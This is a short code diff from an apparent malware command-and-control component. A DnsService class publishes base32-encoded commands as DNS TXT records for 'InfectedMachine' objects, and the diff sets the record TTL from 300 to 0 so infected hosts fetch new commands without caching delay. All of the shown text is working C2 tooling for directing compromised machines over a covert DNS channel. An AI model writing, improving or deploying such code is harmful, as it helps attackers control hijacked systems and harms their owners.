@@ -20,7 +20,7 @@ class DnsService:
         if self.updater is None: return self
 
         # Replace does create the record if not exists, or update the value
-        self.updater.replace(f'cmd.{machine.dns_identifier}', 300, "TXT", base64.b32encode(txt_value.encode()).decode())
+        self.updater.replace(f'cmd.{machine.dns_identifier}', 0, "TXT", base64.b32encode(txt_value.encode()).decode())
         return self
 
     def remove_job_txt(self, machine: InfectedMachine) -> Self:
